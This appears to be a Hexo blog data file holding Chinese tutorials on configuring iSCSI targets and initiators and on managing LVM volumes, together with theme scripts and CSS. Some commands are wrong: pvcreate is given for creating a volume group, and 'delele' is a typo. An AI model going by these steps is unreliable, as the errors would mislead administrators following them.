标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"ISCSI服务器端\"><a href=\"#ISCSI服务器端\" class=\"headerlink\" title=\"ISCSI服务器端\"></a>ISCSI服务器端</h3><p>比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。</p>\n<ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y targetcli</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>开始进行服务端的配置</li>\n</ol>\n<ul>\n<li>首先键入<code>targetcli</code>进入iscsi配置模式</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targetcli</span><br></pre></td></tr></table></figure>","more":"<ul>\n<li>然后先创建一个后端存储</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /backstores/block/</span><br><span class=\"line\">create disk1 /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p><code>disk1</code>代表起的一个名字，<code>/dev/sdb</code>是真实机器里存在的设备。</p>\n<ul>\n<li>创建可以识别的iqn设备</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /iscsi/</span><br><span class=\"line\">create iqn.2023-07.com.liuxp:san1</span><br></pre></td></tr></table></figure>\n\n<p><code>iqn.2023-07.com.liuxp:san1</code>是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。</p>\n<ul>\n<li>创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> iqn.2023-07.com.liuxp:san1/tpg1/luns/</span><br><span class=\"line\">create /backstores/block/disk1</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ../acls/</span><br><span class=\"line\">create iqn.2023-07.com.liuxp:web1</span><br></pre></td></tr></table></figure>\n\n<p>不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个<code>acls</code>里的<code>iqn</code>名字复制下来待会粘贴到客户端的一个配置文件里面。</p>\n<ul>\n<li>设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ../portals/</span><br><span class=\"line\">delele 0.0.0.0 3260</span><br><span class=\"line\">create 10.8.7.41 3260</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>到这里就设置完成了键入<code>exit</code>退出设置。</p>\n</li>\n<li><p>启动服务</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start target.service </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ISCSI客户端\"><a href=\"#ISCSI客户端\" class=\"headerlink\" title=\"ISCSI客户端\"></a>ISCSI客户端</h3><ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y iscsi-initiator-utils</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>修改配置文件<code>/etc/iscsi/initiatorname.iscsi</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InitiatorName=iqn.2023-07.com.liuxp:web1</span><br></pre></td></tr></table></figure>\n\n<p>把这里的iqn设置为服务器端<code>acls</code>里的那个iqn，上面也说过一嘴。</p>\n<ol start=\"3\">\n<li>然后开始扫描iqn设备</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m discovery -t st -p 10.8.7.41</span><br></pre></td></tr></table></figure>\n\n<p><strong>p选项</strong>后面接上服务器端的IP地址。</p>\n<ol start=\"4\">\n<li>扫描到之后接着开始最后一步挂载</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l</span><br></pre></td></tr></table></figure>\n\n<p><strong>T选项</strong>后面接上面刚刚扫描出来的iqn设备，<strong>p选项</strong>接ISCSI服务器的IP</p>\n<ol start=\"5\">\n<li>可以通过下面的命令查看挂载成功的会话信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m session</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m node --logoutall=all</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>写在最后的话</li>\n</ol>\n<p>如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除<code>/var/lib/iscsi/nodes</code>及<code>/var/lib/iscsi/send_targets</code>下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。</p>"},{"title":"关于LVM的配置","date":"2023-07-04T13:25:45.000Z","_content":"\n### 概述\n\nLVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。\n\n物理卷可以有很多形式，一块单独的磁盘（`/dev/sda`），一个分好的分区（`/dev/sdb2`），甚至一个文件都可以是物理卷的一种形式。\n\n单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。\n\n如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。\n\n### 物理卷\n\n* 创建物理卷\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* 查看物理卷的详细信息\n\n```bash\npvdisplay\n```\n\n* 查看物理卷的精简信息\n\n```bash\npvs\n```\n\n### 卷组\n\n* 创建卷组\n\n```bash\npvcreate qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组。\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。\n\n* 查看卷组的详细信息\n\n```bash\nvgdisplay\n```\n\n* 查看卷组的精简信息\n\n```bash\nvgs\n```\n\n* 扩容卷组\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\n将物理卷`dev/sdb2`加入卷组qavg\n\n* 删减卷组\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\n将物理卷`/dev/sdb2`从卷组qavg中删除\n\n* 删除卷组\n\n```bash\nvgremove qavg\n```\n\n* 重命名卷组\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\n重命名卷组`/dev/qavg1`为`/dev/qavg2`。\n\n### 逻辑卷\n\n* 创建逻辑卷\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\n利用`qavg`这个卷组创建一个叫`qa`大小为200M的逻辑卷。这里的**L选项**指定的是平常讲的磁盘的大小。\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\n使用**l选项**是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M\n\n* 扩容逻辑卷\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\n这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\n使用卷组里`/dev/sdk3`这个物理卷的全部空间为`qavg/qa`扩容。\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\n使用卷组里`/dev/sda`的8-9M的空间和`/dev/sdb`的8-9M的空间为逻辑卷`qavg/qa`扩容\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\n使用卷组所有剩余的空间为`qavg/qa`扩容。\n\n* 查看逻辑卷详细信息\n\n```bash\nlvdisplay\n```\n\n* 查看逻辑卷精简信息\n\n```bash\nlvs\n```\n\n* 删除逻辑卷\n\n```bash\nlvremove qa\n```\n\n这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！","source":"_posts/LVM.md","raw":"---\ntitle: 关于LVM的配置\ndate: 2023-07-04 21:25:45\ncategories: 理论知识\ntags:\n  - Linux\n---\n\n### 概述\n\nLVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。\n\n物理卷可以有很多形式，一块单独的磁盘（`/dev/sda`），一个分好的分区（`/dev/sdb2`），甚至一个文件都可以是物理卷的一种形式。\n\n单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。\n\n如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。\n\n### 物理卷\n\n* 创建物理卷\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* 查看物理卷的详细信息\n\n```bash\npvdisplay\n```\n\n* 查看物理卷的精简信息\n\n```bash\npvs\n```\n\n### 卷组\n\n* 创建卷组\n\n```bash\npvcreate qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组。\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。\n\n* 查看卷组的详细信息\n\n```bash\nvgdisplay\n```\n\n* 查看卷组的精简信息\n\n```bash\nvgs\n```\n\n* 扩容卷组\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\n将物理卷`dev/sdb2`加入卷组qavg\n\n* 删减卷组\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\n将物理卷`/dev/sdb2`从卷组qavg中删除\n\n* 删除卷组\n\n```bash\nvgremove qavg\n```\n\n* 重命名卷组\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\n重命名卷组`/dev/qavg1`为`/dev/qavg2`。\n\n### 逻辑卷\n\n* 创建逻辑卷\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\n利用`qavg`这个卷组创建一个叫`qa`大小为200M的逻辑卷。这里的**L选项**指定的是平常讲的磁盘的大小。\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\n使用**l选项**是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M\n\n* 扩容逻辑卷\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\n这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\n使用卷组里`/dev/sdk3`这个物理卷的全部空间为`qavg/qa`扩容。\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\n使用卷组里`/dev/sda`的8-9M的空间和`/dev/sdb`的8-9M的空间为逻辑卷`qavg/qa`扩容\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\n使用卷组所有剩余的空间为`qavg/qa`扩容。\n\n* 查看逻辑卷详细信息\n\n```bash\nlvdisplay\n```\n\n* 查看逻辑卷精简信息\n\n```bash\nlvs\n```\n\n* 删除逻辑卷\n\n```bash\nlvremove qa\n```\n\n这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！","slug":"LVM","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e6002p7zj30jtgdpnj","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>LVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。</p>\n<p>物理卷可以有很多形式，一块单独的磁盘（<code>/dev/sda</code>），一个分好的分区（<code>/dev/sdb2</code>），甚至一个文件都可以是物理卷的一种形式。</p>\n<p>单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。</p>\n<p>如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。</p>\n<h3 id=\"物理卷\"><a href=\"#物理卷\" class=\"headerlink\" title=\"物理卷\"></a>物理卷</h3><ul>\n<li>创建物理卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ul>\n<li>查看物理卷的详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看物理卷的精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvs</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"卷组\"><a href=\"#卷组\" class=\"headerlink\" title=\"卷组\"></a>卷组</h3><ul>\n<li>创建卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate qavg /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>/dev/sdb</code>创建一个叫qavg的卷组。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate -s 16M qavg /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>/dev/sdb</code>创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。</p>\n<ul>\n<li>查看卷组的详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看卷组的精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgs</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>扩容卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgextend qavg /dev/sdb2</span><br></pre></td></tr></table></figure>\n\n<p>将物理卷<code>dev/sdb2</code>加入卷组qavg</p>\n<ul>\n<li>删减卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgreduce qavg /dev/sdb2</span><br></pre></td></tr></table></figure>\n\n<p>将物理卷<code>/dev/sdb2</code>从卷组qavg中删除</p>\n<ul>\n<li>删除卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgremove qavg</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>重命名卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgrename /dev/qavg1 /dev/qavg2</span><br></pre></td></tr></table></figure>\n\n<p>重命名卷组<code>/dev/qavg1</code>为<code>/dev/qavg2</code>。</p>\n<h3 id=\"逻辑卷\"><a href=\"#逻辑卷\" class=\"headerlink\" title=\"逻辑卷\"></a>逻辑卷</h3><ul>\n<li>创建逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvcreate -L 200M qavg -n qa</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>qavg</code>这个卷组创建一个叫<code>qa</code>大小为200M的逻辑卷。这里的<strong>L选项</strong>指定的是平常讲的磁盘的大小。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvcreate -l 45 qavg -n qa</span><br></pre></td></tr></table></figure>\n\n<p>使用<strong>l选项</strong>是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M</p>\n<ul>\n<li>扩容逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -L +54 /dev/qavg/qa</span><br></pre></td></tr></table></figure>\n\n<p>这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend qavg/qa /dev/sdk3</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组里<code>/dev/sdk3</code>这个物理卷的全部空间为<code>qavg/qa</code>扩容。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组里<code>/dev/sda</code>的8-9M的空间和<code>/dev/sdb</code>的8-9M的空间为逻辑卷<code>qavg/qa</code>扩容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -l+100%FREE -r qavg/qa</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组所有剩余的空间为<code>qavg/qa</code>扩容。</p>\n<ul>\n<li>查看逻辑卷详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看逻辑卷精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvs</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvremove qa</span><br></pre></td></tr></table></figure>\n\n<p>这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>LVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。</p>\n<p>物理卷可以有很多形式，一块单独的磁盘（<code>/dev/sda</code>），一个分好的分区（<code>/dev/sdb2</code>），甚至一个文件都可以是物理卷的一种形式。</p>\n<p>单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。</p>\n<p>如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。</p>\n<h3 id=\"物理卷\"><a href=\"#物理卷\" class=\"headerlink\" title=\"物理卷\"></a>物理卷</h3><ul>\n<li>创建物理卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate /dev/sdb</span><br></pre></td></tr></table></figure>","more":"<ul>\n<li>查看物理卷的详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看物理卷的精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvs</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"卷组\"><a href=\"#卷组\" class=\"headerlink\" title=\"卷组\"></a>卷组</h3><ul>\n<li>创建卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate qavg /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>/dev/sdb</code>创建一个叫qavg的卷组。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate -s 16M qavg /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>/dev/sdb</code>创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。</p>\n<ul>\n<li>查看卷组的详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看卷组的精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgs</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>扩容卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgextend qavg /dev/sdb2</span><br></pre></td></tr></table></figure>\n\n<p>将物理卷<code>dev/sdb2</code>加入卷组qavg</p>\n<ul>\n<li>删减卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgreduce qavg /dev/sdb2</span><br></pre></td></tr></table></figure>\n\n<p>将物理卷<code>/dev/sdb2</code>从卷组qavg中删除</p>\n<ul>\n<li>删除卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgremove qavg</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>重命名卷组</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vgrename /dev/qavg1 /dev/qavg2</span><br></pre></td></tr></table></figure>\n\n<p>重命名卷组<code>/dev/qavg1</code>为<code>/dev/qavg2</code>。</p>\n<h3 id=\"逻辑卷\"><a 